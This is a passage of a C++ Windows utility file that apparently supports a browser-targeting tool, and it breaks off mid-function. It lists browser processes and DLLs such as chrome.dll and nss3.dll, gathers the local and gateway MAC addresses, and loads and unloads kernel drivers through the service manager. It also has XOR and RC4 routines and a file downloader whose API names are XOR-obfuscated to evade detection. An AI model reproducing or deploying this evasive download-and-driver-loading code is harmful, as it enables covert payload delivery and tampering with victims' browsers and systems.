#include "fun.h"

const char* g_browser_name[] = { "msedge.exe","chrome.exe","360ChromeX.exe","360se.exe" };
const char* g_browser_ProductName[] = { "QQBrowse","小白浏览器","搜狗高速浏览器", "360安全浏览器", "360ChromeX","360极速浏览器",  "Microsoft Edge","2345加速浏览器", "UC浏览器", "Google Chrome", "Internet Explorer", "Maxthon" , "Liebao Safe Browser" ,"Firefox","TheWorld"};
const wchar_t* g_dll_name2[] = { L"msedge.dll",L"chrome.dll", L"WebkitCore.dll", L"chrome_child.dll", L"nss3.dll" };
const char* g_dll_name[] = { "msedge.dll","chrome.dll", "WebkitCore.dll", "chrome_child.dll","nss3.dll"};
int g_num = 0;//遍历文件夹，一级目录

// 在64位下获取32模块基址 使用 UnmapViewOfFile 释放内存
LPVOID Wow64_GetModuleHandle(const wchar_t *path)
{
	LPVOID lpBaseAddress = 0;
	HANDLE hFile = CreateFile(path, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile)
	{
		HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		if (hMap)
		{
			lpBaseAddress = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
			CloseHandle(hMap);
		}
		CloseHandle(hFile);
	}
	return lpBaseAddress;
}

//在64位下获取 模块函数地址 注意获取32位模块地址时转换位32位类型ULONG32
PVOID Wow64_GetProcAddress(LPVOID Base, const char *lpProcName)
{
	PIMAGE_DOS_HEADER DOS = (PIMAGE_DOS_HEADER)Base;
	if (DOS)
	{
		PIMAGE_NT_HEADERS32 NTH = (PIMAGE_NT_HEADERS32)((SIZE_T)Base + DOS->e_lfanew);
		DWORD VirtualAddress = NTH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		DWORD Size = NTH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if (VirtualAddress && Size)
		{
			PIMAGE_EXPORT_DIRECTORY ET = (PIMAGE_EXPORT_DIRECTORY)((PCHAR)Base + VirtualAddress); //导出表
			PULONG FunctionAddresses = (PULONG)((PCHAR)Base + ET->AddressOfFunctions);
			PSHORT FunIndexs = (PSHORT)((PCHAR)Base + ET->AddressOfNameOrdinals);
			PULONG names = (PULONG)((PCHAR)Base + ET->AddressOfNames);

			for (size_t i = 0; i < ET->NumberOfNames; i++)
			{
				ULONG ulFunIndex = FunIndexs[i];
				if (FunctionAddresses[ulFunIndex] < VirtualAddress || FunctionAddresses[ulFunIndex] >= VirtualAddress + Size)
				{
					// printf("%s  \t\t\t= %p \n", (PSTR)((PCHAR)Base + names[i]), (PCHAR)Base + FunctionAddresses[ulFunIndex]);

					if (strcmp((PSTR)((PCHAR)Base + names[i]), lpProcName) == 0)
					{
						return ((PCHAR)Base + FunctionAddresses[ulFunIndex]);
					}
				}
			}
		}
	}

	return 0;
}

//查询文件版本信息
BOOL w_query_version(const wchar_t *ValueName, wchar_t *szModuleName, wchar_t *RetStr)
{
    BOOL bSuccess = 0;
    BYTE *lpVersionData = 0;
    DWORD dwLangCharset = 0;

    do
    {
        if (!ValueName || !szModuleName)
            break;

        DWORD dwHandle = 0;
        UINT nQuerySize = 0;
        DWORD *pTransTable = 0;

        // 判断系统能否检索到指定文件的版本信息
        DWORD dwDataSize = GetFileVersionInfoSize((LPCWSTR)szModuleName, &dwHandle);
        if (dwDataSize == 0)
            break;

        lpVersionData = (BYTE*)malloc(dwDataSize); // 分配缓冲区

        if (NULL == lpVersionData)
            break;

        // 检索信息
        if (!GetFileVersionInfo((LPCWSTR)szModuleName, dwHandle, dwDataSize, (void *)lpVersionData))
            break;

        // 设置语言
        if (!VerQueryValue(lpVersionData, L"\\VarFileInfo\\Translation", (void **)&pTransTable, &nQuerySize))
            break;

        dwLangCharset = MAKELONG(HIWORD(pTransTable[0]), LOWORD(pTransTable[0]));
        if (lpVersionData == NULL)
            break;

        wchar_t tmpstr[128] = {0};
        wsprintf(tmpstr, L"\\StringFileInfo\\%08lx\\%ws", dwLangCharset, ValueName);

        // LPVOID lpData;

        // 调用此函数查询前需要先依次调用函数GetFileVersionInfoSize和GetFileVersionInfo

        LPVOID lpData = 0;
        if (VerQueryValue((void *)lpVersionData, tmpstr, &lpData, &nQuerySize))
            wcscpy(RetStr, (wchar_t *)lpData);

        bSuccess = TRUE;
    } while (FALSE);

    // 销毁缓冲区
    if (lpVersionData)
    {
        free(lpVersionData);
    }

    return bSuccess;
}

BOOL query_version(const char* ValueName, char* szModuleName, char* RetStr)
{

    BOOL bSuccess = 0;
    BYTE* lpVersionData = 0;
    DWORD dwLangCharset = 0;

    do
    {
        if (!ValueName || !szModuleName)
            break;

        DWORD dwHandle = 0;
        UINT nQuerySize = 0;
        DWORD* pTransTable = 0;

        // 判断系统能否检索到指定文件的版本信息
        DWORD dwDataSize = GetFileVersionInfoSizeA(szModuleName, &dwHandle);
        if (dwDataSize == 0)
            break;

        lpVersionData = (BYTE*)malloc(dwDataSize); // 分配缓冲区

        if (NULL == lpVersionData)
            break;

        // 检索信息
        if (!GetFileVersionInfoA((LPCSTR)szModuleName, dwHandle, dwDataSize, (void*)lpVersionData))
            break;

        // 设置语言
        if (!VerQueryValueA(lpVersionData, "\\VarFileInfo\\Translation", (void**)&pTransTable, &nQuerySize))
            break;

        dwLangCharset = MAKELONG(HIWORD(pTransTable[0]), LOWORD(pTransTable[0]));
        if (lpVersionData == NULL)
            break;

        char tmpstr[128] = { 0 };
        sprintf(tmpstr, "\\StringFileInfo\\%08lx\\%s", dwLangCharset, ValueName);

        // LPVOID lpData;

        // 调用此函数查询前需要先依次调用函数GetFileVersionInfoSize和GetFileVersionInfo

        LPVOID lpData = 0;
        if (VerQueryValueA((void*)lpVersionData, (LPCSTR)tmpstr, &lpData, &nQuerySize))
            strcpy(RetStr, (char*)lpData);

        bSuccess = TRUE;
    } while (FALSE);

    // 销毁缓冲区
    if (lpVersionData)
    {
        free(lpVersionData);
    }

    return bSuccess;
}



//获取本机MAC 与网关MAC
int get_mac_wmac(char* mac, char* wmac)
{

	WSADATA wsd;
	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		return 0;
	}

	int st = 0;
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG uLen = 0;
	ULONG mlen = 6;
	u_char GatewayMac[6] = { 0 };
	memset(mac, 0, 20);
	memset(wmac, 0, 20);


	GetAdaptersInfo(pAdapterInfo, &uLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)GlobalAlloc(GPTR, uLen);

	if (pAdapterInfo)
	{
		
		if (GetAdaptersInfo(pAdapterInfo, &uLen) == ERROR_SUCCESS)
		{
			PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
			while (pAdapter) 
			{
				IPAddr  ipaddr=inet_addr(pAdapter->IpAddressList.IpAddress.String);
				if(ipaddr)
				{
					//get mac
					st = SendARP(ipaddr, 0, GatewayMac, &mlen);
					sprintf(mac, "%02X-%02X-%02X-%02X-%02X-%02X", GatewayMac[0], GatewayMac[1], GatewayMac[2], GatewayMac[3], GatewayMac[4], GatewayMac[5]);

					//get wamc
					memset(GatewayMac, 0, 6);
					st = SendARP(inet_addr(pAdapter->GatewayList.IpAddress.String), 0, GatewayMac, &mlen);
					sprintf(wmac, "%02X-%02X-%02X-%02X-%02X-%02X", GatewayMac[0], GatewayMac[1], GatewayMac[2], GatewayMac[3], GatewayMac[4], GatewayMac[5]);
					st = 1;
					break;
				}

				
				pAdapter = pAdapter->Next;
			}
			

		}

		GlobalFree(pAdapterInfo);		
	}

	if (st == 0)
	{
		sprintf(mac, "00-00-00-00-00-00");
		sprintf(wmac, "00-00-00-00-00-00");
	}


	return st;
}

//返回值需要释放free
char *http_get(char *url)
{
    char *html = 0;
    DWORD dLen = 8192;
    HINTERNET hIo = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hIo)
    {
        HINTERNET hIou = InternetOpenUrlA(hIo, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
        if (hIou)
        {

            DWORD reqlen = 32;
            char req_length[32] = {0};
            HttpQueryInfoA(hIou, HTTP_QUERY_CONTENT_LENGTH, req_length, &reqlen, NULL);
            dLen = atol(req_length) + 2;

            html = (char*)malloc(dLen);
            if (html)
            {
                memset(html, 0, dLen);
                InternetReadFile(hIou, html, dLen, &dLen);
            }

            InternetCloseHandle(hIou);
        }
        InternetCloseHandle(hIo);
    }
    return html;
}

//解密数据
unsigned char *decrypt(unsigned char *data, size_t length)
{
    DWORD op = 0;
    VirtualProtect(data, length, PAGE_READWRITE, &op);
    for (size_t i = 0; i < length; i++)
    {
        if (data[i] && data[i] != 42) //不解密0
        {
            data[i] = (unsigned char)data[i] ^ 42;
        }
    }
    return 0;
}

//写到文件
int write_file(const wchar_t *path, void *data, size_t length)
{

    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD osz;
        WriteFile(hFile, data, (DWORD)length, &osz, 0);
        CloseHandle(hFile);
        return 1;
    }
    return 0;
}

//写到文件
int write_file2(std::wstring path, void* data, size_t length)
{

    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD osz;
        WriteFile(hFile, data, (DWORD)length, &osz, 0);
        CloseHandle(hFile);
        return 1;
    }
    return 0;
}

// foa -> rva
DWORD foa_to_rva(PVOID PeBase, DWORD dwFoa)
{
    PIMAGE_DOS_HEADER PDOS = NULL;
    PIMAGE_NT_HEADERS64 PNT64 = NULL;
    PIMAGE_NT_HEADERS32 PNT32 = NULL;
    PIMAGE_SECTION_HEADER PSC = NULL;

    if ((PeBase == 0) || (dwFoa == 0))
    {
        return 0;
    }

    PDOS = (PIMAGE_DOS_HEADER)PeBase;
    if (PDOS->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    PNT64 = (PIMAGE_NT_HEADERS64)((SIZE_T)PeBase + PDOS->e_lfanew);

    if (PNT64->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    DWORD SizeOfHeaders = 0;
    if ((PNT64->FileHeader.Machine & IMAGE_FILE_MACHINE_I386) == IMAGE_FILE_MACHINE_I386) // 32
    {
        PNT32 = (PIMAGE_NT_HEADERS32)((SIZE_T)PeBase + PDOS->e_lfanew);

        SizeOfHeaders = PNT32->OptionalHeader.SizeOfHeaders;
        PSC = (PIMAGE_SECTION_HEADER)((SIZE_T)PNT32 + sizeof(IMAGE_NT_HEADERS32));
    }
    else
    {

        SizeOfHeaders = PNT64->OptionalHeader.SizeOfHeaders;
        PSC = (PIMAGE_SECTION_HEADER)((SIZE_T)PNT64 + sizeof(IMAGE_NT_HEADERS64));
    }

    if (dwFoa <= SizeOfHeaders)
        return (DWORD)dwFoa;

    for (size_t i = 0; i < PNT64->FileHeader.NumberOfSections; i++)
    {
        // printf("Name=%s\n",PSC[i].Name);

        //判断 :   文件对齐+文件偏移>file_panyi>文件偏移  (即是在文件的哪个节中)
        if ((dwFoa >= PSC[i].PointerToRawData) && (dwFoa < PSC[i].PointerToRawData + PSC[i].SizeOfRawData))
        {
            return dwFoa - PSC[i].PointerToRawData + PSC[i].VirtualAddress;
        }
    }

    return 0;
}

// sunday算法
unsigned char *sunday(void *a_buf1, unsigned int len1, void *a_buf2, unsigned int len2)
{

    unsigned char *buf1 = (unsigned char *)a_buf1;
    unsigned char *buf2 = (unsigned char *)a_buf2;

    unsigned int next[256];
    unsigned int i, j, pos;

    for (i = 0; i < 256; ++i)
    {

        next[i] = len2 + 1;
    }

    for (i = 0; i < len2; ++i)
    {

        next[buf2[i]] = len2 - i;
    }

    pos = 0;
    while (pos < len1 - len2 + 1)
    {

        i = pos;
        j = 0;

        while (j < len2)
        {

            if (buf1[i] != buf2[j])
            {

                pos += next[buf1[pos + len2]];
                break;
            }

            ++i;
            ++j;
        }
        if (j == len2)
        {

            return &buf1[pos];
        }
    }

    return NULL;
}

char *get_random_string(int n)
{
    static char rs[128];
    char chs[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    size_t i = 0;
    int min = 0;
    int max = sizeof(chs) - 1;
    for (i = 0; i < n; i++)
    {
        static int seed;
        seed += i + (size_t)rs;
        srand(seed);
        int r = rand() % ((max) - (min) + 1) + (min);
        rs[i] = chs[r];
        if (rs[i] == 0)
            i--;
    }
    rs[i] = 0;
    return rs;
}

//数据加解密
void *DataEnc(void *Data, size_t DataLength, int type)
{
    unsigned char *pDATA = (unsigned char *)Data;
    if (Data == 0 || DataLength == 0)
        return 0;

    if (type == 0) //加密
    {
        for (size_t i = 0; i < DataLength; i++)
        {
            pDATA[i] = ((pDATA[i] ^ 42) ^ i);
        }
    }
    else //解密
    {
        for (size_t i = 0; i < DataLength; i++)
        {
            pDATA[i] = ((pDATA[i] ^ i) ^ 42);
        }
    }

    return pDATA;
}


//遍历文件夹
wchar_t* GetAllgpxFilepathFromfolder(const wchar_t* Path, wchar_t* NewPath)
{

	wchar_t szFind[MAX_PATH];
	WIN32_FIND_DATA FindFileData;
	wcscpy(szFind, Path);
	wcscat(szFind, L"\\*.exe");
	HANDLE hFind = FindFirstFileW(szFind, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)
		return NULL;

	do
	{
		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
            char szProductName[128] = { 0 };
			char szallpath[256] = { 0 };
			sprintf(szallpath, "%ws\\%ws", Path, FindFileData.cFileName);

			query_version("ProductName", szallpath, szProductName); //从文件查询产品名
			if (strcmp(szProductName, "小白浏览器") == 0)
			{
				wcscpy(NewPath, FindFileData.cFileName);
				LOG(L"NewPath = %s ", NewPath);
				return NewPath;

			}
		}
	} while (FindNextFile(hFind, &FindFileData));

	FindClose(hFind);

	return 0;
}


//创建进程
DWORD RunExe(wchar_t *cmd, int wShowWindow)
{
    

	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.wShowWindow = wShowWindow;
	PROCESS_INFORMATION pi = { 0 };
	if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	return pi.dwProcessId;
}

HANDLE LoadSYS(const TCHAR* szDriverPath, const TCHAR* szLinkName)
{


    //打开到驱动的所控设备的句柄
    TCHAR devFile[260] = { 0 };
    wsprintf(devFile, L"\\\\.\\%s", szLinkName);
    HANDLE hDriver = CreateFile(devFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver != INVALID_HANDLE_VALUE)
    {
        return hDriver;
    }



    //打开scm管理器
    SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hScm == NULL)
    {
        printf("打开服务控制管理器失败，可能因为你不具有administrator权限\n");
        return 0;
    }

    //创建或打开服务
    SC_HANDLE hService = CreateService(hScm, szLinkName, szLinkName, SC_MANAGER_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, szDriverPath, NULL, NULL, NULL, NULL, NULL);

    if (hService == NULL)
    {
        int nError = GetLastError();
        if (nError == ERROR_SERVICE_EXISTS || nError == ERROR_SERVICE_MARKED_FOR_DELETE)
        {
            hService = OpenService(hScm, szLinkName, SERVICE_ALL_ACCESS);
        }
    }

    if (hService == NULL)
    {
        printf("创建服务失败!\n");
        return 0;
    }


    //启动服务
    if (!StartService(hService, 0, NULL))
    {
        int nError = GetLastError();
        if (nError == ERROR_SERVICE_ALREADY_RUNNING)
        {
            printf("服务已经在运行!\n");
            return 0;
        }
    }

    //打开到驱动的所控设备的句柄


    hDriver = CreateFile(devFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("打开设备失败! %ws %ws\n", szLinkName,devFile);
        return 0;
    }

    //CloseHandle(hDriver);
    //服务完全停止运行
    //SERVICE_STATUS ss;
    //ControlService(hService, SERVICE_CONTROL_STOP, &ss);
    //从scm数据库中删除服务
    //DeleteService(hService);

    CloseServiceHandle(hService);
    CloseServiceHandle(hScm);

    return hDriver;
}


//装载NT驱动程序
BOOL LoadNTDriver(wchar_t *lpszDriverName, wchar_t *lpszDriverPath)
{
    wchar_t szDriverImagePath[256];
    //得到完整的驱动路径
    GetFullPathNameW(lpszDriverPath, 256, szDriverImagePath, NULL);

    BOOL bRet = FALSE;

    SC_HANDLE hServiceMgr = NULL; // SCM管理器的句柄
    SC_HANDLE hServiceDDK = NULL; // NT驱动程序的服务句柄

    //打开服务控制管理器
    hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (hServiceMgr == NULL)
    {
        // OpenSCManager失败
        //printf("OpenSCManager() 失败 错误码：%d ! \n", GetLastError());
        bRet = FALSE;
        if (hServiceDDK)
        {
            CloseServiceHandle(hServiceDDK);
        }
        if (hServiceMgr)
        {
            CloseServiceHandle(hServiceMgr);
        }
        return bRet;
    }
    else
    {

        //printf("OpenSCManager() 成功! \n");
    }

    //创建驱动所对应的服务
    hServiceDDK = CreateService(hServiceMgr,
                                lpszDriverName,        //驱动程序的在注册表中的名字
                                lpszDriverName,        // 注册表驱动程序的 DisplayName 值
                                SERVICE_ALL_ACCESS,    // 加载驱动程序的访问权限
                                SERVICE_KERNEL_DRIVER, // 表示加载的服务是驱动程序
                                SERVICE_DEMAND_START,  // 注册表驱动程序的 Start 值
                                SERVICE_ERROR_IGNORE,  // 注册表驱动程序的 ErrorControl 值
                                szDriverImagePath,     // 注册表驱动程序的 ImagePath 值
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL);

    DWORD dwRtn;
    //判断服务是否失败
    if (hServiceDDK == NULL)
    {
        dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS)
        {
            //由于其他原因创建服务失败
            //printf("CrateService() 失败 错误码：%d ! \n", dwRtn);
            bRet = FALSE;
            if (hServiceDDK)
            {
                CloseServiceHandle(hServiceDDK);
            }
            if (hServiceMgr)
            {
                CloseServiceHandle(hServiceMgr);
            }
            return bRet;

            
        }
        else
        {
            //服务创建失败，是由于服务已经创立过
            //printf("服务创建失败，是由于服务已经创立过\n");
           // printf("CrateService() 失败 Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n");
        }

        // 驱动程序已经加载，只需要打开
        hServiceDDK = OpenService(hServiceMgr, lpszDriverName, SERVICE_ALL_ACCESS);
        if (hServiceDDK == NULL)
        {
            //如果打开服务也失败，则意味错误
            dwRtn = GetLastError();
            //printf("打开服务失败  错误码：%d ! \n", dwRtn);
            bRet = FALSE;
            if (hServiceDDK)
            {
                CloseServiceHandle(hServiceDDK);
            }
            if (hServiceMgr)
            {
                CloseServiceHandle(hServiceMgr);
            }
            return bRet;
        }
        else
        {
            //printf("打开服务 成功 ! \n");
        }
    }
    else
    {
        //printf("创建服务 成功! \n");
    }

    //开启此项服务
    bRet = StartServiceW(hServiceDDK, 0, NULL);
    if (!bRet)
    {
        DWORD dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING)
        {
            //printf("打开服务失败 错误码： %d ! \n", dwRtn);
            bRet = FALSE;
            if (hServiceDDK)
            {
                CloseServiceHandle(hServiceDDK);
            }
            if (hServiceMgr)
            {
                CloseServiceHandle(hServiceMgr);
            }
            return bRet;
        }
        else
        {
            if (dwRtn == ERROR_IO_PENDING)
            {
                //设备被挂住
                //printf("打开服务失败，被挂住 ERROR_IO_PENDING ! \n");
                bRet = FALSE;
                if (hServiceDDK)
                {
                    CloseServiceHandle(hServiceDDK);
                }
                if (hServiceMgr)
                {
                    CloseServiceHandle(hServiceMgr);
                }
                return bRet;
            }
            else
            {
                //服务已经开启
                //printf("服务已经开启 ! \n");
                bRet = TRUE;
                if (hServiceDDK)
                {
                    CloseServiceHandle(hServiceDDK);
                }
                if (hServiceMgr)
                {
                    CloseServiceHandle(hServiceMgr);
                }
                return bRet;
            }
        }
    }
    bRet = TRUE;
// //离开前关闭句柄
// BeforeLeave:
//     if (hServiceDDK)
//     {
//         CloseServiceHandle(hServiceDDK);
//     }
//     if (hServiceMgr)
//     {
//         CloseServiceHandle(hServiceMgr);
//     }
    return bRet;
}

//卸载驱动程序
BOOL UnloadNTDriver(wchar_t *szSvrName)
{
    BOOL bRet = FALSE;
    SC_HANDLE hServiceMgr = NULL; // SCM管理器的句柄
    SC_HANDLE hServiceDDK = NULL; // NT驱动程序的服务句柄
    SERVICE_STATUS SvrSta;
    //打开SCM管理器
    hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hServiceMgr == NULL)
    {
        //带开SCM管理器失败
        //printf("OpenSCManager() Faild %d ! \n", GetLastError());
        bRet = FALSE;
        goto BeforeLeave;
    }
    else
    {
        //带开SCM管理器失败成功
        //printf("OpenSCManager() ok ! \n");
    }
    //打开驱动所对应的服务
    hServiceDDK = OpenService(hServiceMgr, szSvrName, SERVICE_ALL_ACCESS);

    if (hServiceDDK == NULL)
    {
        //打开驱动所对应的服务失败
        //printf("OpenService() Faild %d ! \n", GetLastError());
        bRet = FALSE;
        goto BeforeLeave;
    }
    else
    {
        //printf("OpenService() ok ! \n");
    }
    //停止驱动程序，如果停止失败，只有重新启动才能，再动态加载。
    if (!ControlService(hServiceDDK, SERVICE_CONTROL_STOP, &SvrSta))
    {
        //printf("ControlService() Faild %d !\n", GetLastError());
    }
    else
    {
        //打开驱动所对应的失败
        //printf("ControlService() ok !\n");
    }
    //动态卸载驱动程序。
    if (!DeleteService(hServiceDDK))
    {
        //卸载失败
        //printf("DeleteSrevice() Faild %d !\n", GetLastError());
    }
    else
    {
        //卸载成功
        //printf("DelServer:eleteSrevice() ok !\n");
    }
    bRet = TRUE;
BeforeLeave:
    //离开前关闭打开的句柄
    if (hServiceDDK)
    {
        CloseServiceHandle(hServiceDDK);
    }
    if (hServiceMgr)
    {
        CloseServiceHandle(hServiceMgr);
    }
    return bRet;
}

//写注册表
BOOL RegWrite(HKEY hkay, LPCWSTR lpSubKey, DWORD dwType, LPCWSTR KeyName, DWORD64 Data, DWORD DataLength)
{
    HKEY hSubkey = 0;
    if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
    {
        RegSetValueEx(hSubkey, KeyName, 0, dwType, (LPBYTE)&Data, DataLength);
        RegCloseKey(hSubkey);
        return TRUE;
    }
    return FALSE;
}
//写注册表
BOOL RegWrite2(HKEY hkay, VOID* lpSubKey, DWORD dwType, VOID* KeyName, VOID* Data, DWORD DataLength)
{
    HKEY hSubkey = 0;
    if (RegCreateKeyEx(hkay, (LPCWSTR)lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
    {
        RegSetValueExW(hSubkey, (LPCWSTR)KeyName, 0, dwType, (BYTE*)Data, DataLength);
        RegCloseKey(hSubkey);
        return TRUE;
    }
    return FALSE;
}
////读注册表 返回值必须free
//LPBYTE RegRead2(HKEY hkay, LPCWSTR lpSubKey, DWORD dwType, LPCWSTR KeyName)
//{
//
//    HKEY hSubkey = 0;
//    LPBYTE data = 0;
//    //if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
//    if (ERROR_SUCCESS == RegOpenKeyExW(hkay, lpSubKey, 0, KEY_QUERY_VALUE, &hSubkey))
//    {
//        DWORD dwLen = 0;
//        RegQueryValueExW(hSubkey, KeyName, 0, 0, 0, &dwLen);
//        data = (LPBYTE)malloc(dwLen + 2);
//        if (data && dwLen)
//        {
//            data[dwLen] = 0;
//            data[dwLen + 1] = 0;
//            RegQueryValueExW(hSubkey, KeyName, 0, 0, data, &dwLen);
//        }
//
//        RegCloseKey(hSubkey);
//    }
//    return data;
//}


//删除注册表值
BOOL RegDelVal(HKEY hkay, VOID *lpSubKey, VOID *KeyName)
{
    HKEY hSubkey = 0;
    if (RegCreateKeyEx(hkay, (LPCWSTR)lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
    {
        RegDeleteValue(hSubkey, (LPCWSTR)KeyName);
        RegCloseKey(hSubkey);
        return TRUE;
    }
    return FALSE;
}

//读取注册表操作
//注册表路径  键名    返回：键值
long long dllPathToReg(LPCWSTR strSubKey, LPCWSTR Name)
{
    DWORD dwType = REG_QWORD;//定义数据类型
    DWORD dwLen = MAX_PATH;
    long long llval = (long long)malloc(64);
    llval = 0;
    HKEY hTempKey;
    if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, strSubKey, 0, KEY_QUERY_VALUE, &hTempKey))
    {
        if (ERROR_SUCCESS == RegQueryValueExW(hTempKey, Name, 0, &dwType, (LPBYTE)&llval, &dwLen))
        {

            RegCloseKey(hTempKey);
            return llval;
        }
    }
    else
    {

        printf("注册表失败\r\n");
    }
    RegCloseKey(hTempKey);
    return llval;
}





//下载文件
HRESULT DownloadFile(LPCWSTR URL, LPCWSTR LocalFilePath)
{
    char Urlmon[] = {0x7F, 0x59, 0x44, 0x44, 0x41, 0x41};
    char apiURLDownloadToFileW[] = {0x7F, 0x79, 0x64, 0x6D, 0x41, 0x58, 0x42, 0x41, 0x4D, 0x42, 0x44, 0x75, 0x49, 0x61, 0x4D, 0x49, 0x5F, 0x6C};
    DataEnc(Urlmon, sizeof(Urlmon), 1);
    DataEnc(apiURLDownloadToFileW, sizeof(apiURLDownloadToFileW), 1);
    apiURLDownloadToFileW[18] = 0;
    typedef HRESULT(STDAPICALLTYPE * URLDOWNLOADTOFILEW)(_In_opt_ LPUNKNOWN, _In_ LPCWSTR, _In_opt_ LPCWSTR, DWORD, _In_opt_ LPBINDSTATUSCALLBACK);
    HMODULE hurlmon = LoadLibraryA(Urlmon);
    printf("%p,<=%s =>\r\n\r\n\r\n", hurlmon, apiURLDownloadToFileW);
    URLDOWNLOADTOFILEW pURLDownloadToFileW = (URLDOWNLOADTOFILEW)GetProcAddress(hurlmon, apiURLDownloadToFileW);
    wprintf(L"下载文件  %s \r\n %s\r\n  %p", URL, LocalFilePath, pURLDownloadToFileW);
    if (pURLDownloadToFileW)
    {
        wprintf(L"下载文件  %s \r\n %s\r\n", URL, LocalFilePath);
        return pURLDownloadToFileW(0, URL, LocalFilePath, 0, 0);
    }

    return -1;
}


//原文 原文长度 密钥 密钥长度 密文
void rc4(unsigned char* plaintext, int plaintext_length, unsigned char* key, int keylength, unsigned char* ciphertext) 
{
    unsigned char S[256];
    int i, j=0, k = 0,n=0, temp;
    for (i = 0; i < 256; i++)
        S[i] = i;

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + (key [ i % keylength])) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    i = 0; j = 0; 
    for (k = 0; k < plaintext_length; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        n =S[(S[i] +S[j]) % 256];
        ciphertext[k] = plaintext[k] ^ n;
    }
}
//============================================================

//读注册表
DWORD64 RegReadQword(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName)
{
    HKEY hSubkey = 0;
    DWORD64 data = 0;
    if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
    {
        DWORD dwLen = sizeof(DWORD64);
        DWORD type = REG_QWORD;
        RegQueryValueExW(hSubkey, KeyName, 0, &type, (LPBYTE)&data, &dwLen);
        RegCloseKey(hSubkey);
    }
    return data;
}


//读注册表 返回值必须free
LPBYTE RegRead(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName)
{
    
    HKEY hSubkey = 0;
    LPBYTE data = 0;
    //if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
    if (ERROR_SUCCESS == RegOpenKeyExW(hkay, lpSubKey, 0, KEY_QUERY_VALUE, &hSubkey))
    {
        DWORD dwLen = 0;
        RegQueryValueExW(hSubkey, KeyName, 0, 0, 0, &dwLen);
        data = (LPBYTE)malloc(dwLen + 2);
        if (data && dwLen)
        {
            data[dwLen] = 0;
            data[dwLen + 1] = 0;
            RegQueryValueExW(hSubkey, KeyName, 0, 0, data, &dwLen);
        }

        RegCloseKey(hSubkey);
    }
    return data;
}
//读注册表 返回值必须free
LPBYTE RegRead2(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName, DWORD* length)
{
    HKEY hSubkey = 0;
    LPBYTE data = 0;
    //if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
